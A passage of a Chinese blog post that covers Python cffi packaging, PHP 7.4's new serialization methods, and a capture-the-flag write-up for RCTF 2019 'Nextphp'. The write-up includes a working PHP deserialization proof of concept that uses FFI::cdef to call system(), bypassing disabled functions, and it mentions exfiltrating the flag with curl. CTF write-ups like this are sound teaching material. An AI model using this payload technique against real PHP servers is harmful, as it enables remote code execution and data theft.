&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">setuptools&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">find_packages&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi-example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">version&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">classifiers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Development Status :: 4 - Beta&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 2&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 3&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: Implementation :: PyPy&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;License :: OSI Approved :: BSD License&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">packages&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">find_packages&lt;/span>&lt;span style="color:#111">(),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">install_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setup_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cffi_modules&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;./build_fnmatch.py:ffi&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">],&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后的cffi_modules指定了需要生成ffi实例的文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pyhon setup.py install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190508189.png" alt="image-20211202190508189">&lt;/p>
&lt;p>没想到是个报错，仔细看一下原因，解决方法是把之前的fnmatch.h中的偏移换成16进制&lt;/p>
&lt;p>再次执行就好了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190825764.png" alt="image-20211202190825764">&lt;/p>
&lt;p>可以看到这种方式比之前生成的文件都要多，相当于安装了一个模块&lt;/p>
&lt;p>然后是一个test_fnmatch.py，注意这里直接用给出的文件还是会报错，把下图高亮的地方换成0x1&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202191447689.png" alt="image-20211202191447689">&lt;/p>
&lt;p>再执行就好了&lt;/p>
&lt;p>cffi和ctypes还有很多的花活，鉴于我的代码能力一般（c和python都是勉强够用的水平），就不班门弄斧了，更多的东西还是看官方文档比较靠谱（链接贴在最后了&lt;/p>
&lt;p>————什么？为什么FFI in PHP介绍的还不如FFI in Python的多？&lt;/p>
&lt;p>emmmmm 这个嘛 才不会说是因为懒呢&lt;/p>
&lt;h2 id="serializable">Serializable&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | php7.4启用&lt;/li>
&lt;/ul>
&lt;p>已有的反序列化魔术方法总是有很多安全问题，这个提议新增了&lt;code>__serialize()&lt;/code>，&lt;code>__unserialize()&lt;/code>，&lt;code>serialize()&lt;/code>，&lt;code>unserialize()&lt;/code>和&lt;code>Serializable()&lt;/code>&lt;/p>
&lt;p>&lt;code>serialize()&lt;/code>检查到&lt;code>__serialize()&lt;/code>的存在后将在序列化之前优先执行，返回序列化形式的数组，如有错抛出TypeError；如果同时有&lt;code>__serialize()&lt;/code>和&lt;code>__sleep()&lt;/code>，后者将被忽略；如果对象实现了&lt;code>Serializable()&lt;/code>接口，接口的&lt;code>serialize()&lt;/code>将被忽略，类中的&lt;code>__serialize()&lt;/code>将被调用；反序列化时触发&lt;code>__unserialize()&lt;/code>&lt;/p>
&lt;p>————好勾八复杂的，建议直接看文档&lt;/p>
&lt;h2 id="rctf-2019nextphp">[RCTF 2019]Nextphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;print_r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__serialize&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果熟读以上三个文档，这个题就很好出了&lt;/p>
&lt;p>我们可以把func设为&lt;code>FFI:cdef&lt;/code>，arg设为&lt;code>int system(char *command)&lt;/code>来执行c代码绕过php.ini中的限制；同时由于Serializable的种种新特性（出题人也在这里设了坑），我们在构造poc时要删除&lt;code>__serialize()&lt;/code>，防止直接return进坑里了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;FFI::cdef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;int system(char *command);&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;start&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>随后在传入的地方执行&lt;code>unserialize(base64_decode(payload))-&amp;gt;__serialize()['ret']-&amp;gt;system(command);&lt;/code>，直接curl外带flag&lt;/p>
